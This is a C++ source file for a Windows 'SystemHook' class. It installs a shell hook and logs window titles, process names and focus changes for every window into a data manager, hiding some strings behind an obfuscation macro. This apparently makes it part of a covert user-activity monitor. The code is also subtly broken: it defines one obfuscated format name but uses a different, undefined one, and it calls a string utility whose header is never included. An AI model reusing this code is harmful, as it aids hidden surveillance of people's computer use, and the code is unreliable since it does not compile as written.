#include "hooks/SystemHook.h"
#include "data/DataManager.h"
#include "core/Logger.h"
#include "utils/TimeUtils.h"
#include "security/Obfuscation.h"
#include <Windows.h>
#include <string>
#include <psapi.h>

// Obfuscated strings
constexpr auto OBF_SYSTEMHOOK_MODULE = OBFUSCATE("SystemHook");
constexpr auto OBF_FOCUSLOG_FORMAT = OBFUSCATE("FocusChange: { gained: %s, lost: %s }");

// Static member initialization
HHOOK SystemHook::s_systemHook = nullptr;
SystemHook* SystemHook::s_instance = nullptr;

SystemHook::SystemHook(DataManager* dataManager)
    : m_dataManager(dataManager), m_isActive(false) {
    s_instance = this;
}

SystemHook::~SystemHook() {
    RemoveHook();
    s_instance = nullptr;
}

bool SystemHook::InstallHook() {
    if (m_isActive) {
        LOG_WARN("System hook already installed");
        return true;
    }

    // Install multiple system hooks for different events
    s_systemHook = SetWindowsHookExW(
        WH_SHELL,
        ShellProc,
        GetModuleHandleW(NULL),
        0
    );

    if (!s_systemHook) {
        DWORD error = GetLastError();
        LOG_ERROR("Failed to install system hook. Error: " + std::to_string(error));
        return false;
    }

    m_isActive = true;
    LOG_INFO("System hook installed successfully");
    return true;
}

bool SystemHook::RemoveHook() {
    if (!m_isActive) return true;

    if (s_systemHook && !UnhookWindowsHookEx(s_systemHook)) {
        DWORD error = GetLastError();
        LOG_ERROR("Failed to remove system hook. Error: " + std::to_string(error));
        return false;
    }

    s_systemHook = nullptr;
    m_isActive = false;
    LOG_INFO("System hook removed successfully");
    return true;
}

LRESULT CALLBACK SystemHook::ShellProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= HC_ACTION && s_instance) {
        s_instance->ProcessShellEvent(wParam, lParam);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void SystemHook::ProcessShellEvent(WPARAM eventType, LPARAM lParam) {
    try {
        switch (eventType) {
            case HSHELL_WINDOWCREATED:
                HandleWindowCreated(reinterpret_cast<HWND>(lParam));
                break;
            case HSHELL_WINDOWDESTROYED:
                HandleWindowDestroyed(reinterpret_cast<HWND>(lParam));
                break;
            case HSHELL_ACTIVATESHELLWINDOW:
                HandleShellActivated();
                break;
            case HSHELL_RUDEAPPACTIVATED:
                HandleAppActivated(reinterpret_cast<HWND>(lParam));
                break;
            default:
                break;
        }
    }
    catch (const std::exception& e) {
        LOG_ERROR(std::string("Error processing system event: ") + e.what());
    }
}

void SystemHook::HandleWindowCreated(HWND hwnd) {
    if (!hwnd) return;

    SystemEventData eventData;
    eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
    eventData.eventType = SystemEventType::WINDOW_CREATED;
    eventData.windowHandle = hwnd;
    eventData.windowTitle = GetWindowTitle(hwnd);
    eventData.processName = GetProcessName(hwnd);

    m_dataManager->AddSystemEventData(eventData);
    LOG_DEBUG("Window created: " + eventData.windowTitle);
}

void SystemHook::HandleWindowDestroyed(HWND hwnd) {
    if (!hwnd) return;

    SystemEventData eventData;
    eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
    eventData.eventType = SystemEventType::WINDOW_DESTROYED;
    eventData.windowHandle = hwnd;
    eventData.windowTitle = GetWindowTitle(hwnd);

    m_dataManager->AddSystemEventData(eventData);
    LOG_DEBUG("Window destroyed: " + eventData.windowTitle);
}

void SystemHook::HandleAppActivated(HWND hwnd) {
    if (!hwnd) return;

    static HWND s_lastActiveWindow = nullptr;
    if (s_lastActiveWindow == hwnd) return;

    SystemEventData eventData;
    eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
    eventData.eventType = SystemEventType::APP_ACTIVATED;
    eventData.windowHandle = hwnd;
    eventData.windowTitle = GetWindowTitle(hwnd);
    eventData.processName = GetProcessName(hwnd);

    // Record previous active window if available
    if (s_lastActiveWindow) {
        eventData.extraInfo = "Previous: " + GetWindowTitle(s_lastActiveWindow);
    }

    m_dataManager->AddSystemEventData(eventData);

    char logMessage[512];
    snprintf(logMessage, sizeof(logMessage), OBFUSCATED_FOCUSLOG_FORMAT,
             eventData.windowTitle.c_str(),
             s_lastActiveWindow ? GetWindowTitle(s_lastActiveWindow).c_str() : "None");

    LOG_DEBUG(logMessage);
    s_lastActiveWindow = hwnd;
}

void SystemHook::HandleShellActivated() {
    SystemEventData eventData;
    eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
    eventData.eventType = SystemEventType::SHELL_ACTIVATED;

    m_dataManager->AddSystemEventData(eventData);
    LOG_DEBUG("Shell activated");
}

std::string SystemHook::GetWindowTitle(HWND hwnd) const {
    wchar_t title[256];
    if (GetWindowTextW(hwnd, title, sizeof(title) / sizeof(wchar_t))) {
        return utils::StringUtils::WideToUtf8(title);
    }
    return "Unknown";
}

std::string SystemHook::GetProcessName(HWND hwnd) const {
    DWORD processId;
    if (GetWindowThreadProcessId(hwnd, &processId)) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
        if (hProcess) {
            wchar_t processName[MAX_PATH];
            DWORD size = sizeof(processName) / sizeof(wchar_t);
            if (QueryFullProcessImageNameW(hProcess, 0, processName, &size)) {
                CloseHandle(hProcess);
                std::wstring wideName(processName);
                std::string fileName = utils::StringUtils::WideToUtf8(
                    wideName.substr(wideName.find_last_of(L"\\") + 1));
                return fileName;
            }
            CloseHandle(hProcess);
        }
    }
    return "Unknown";
}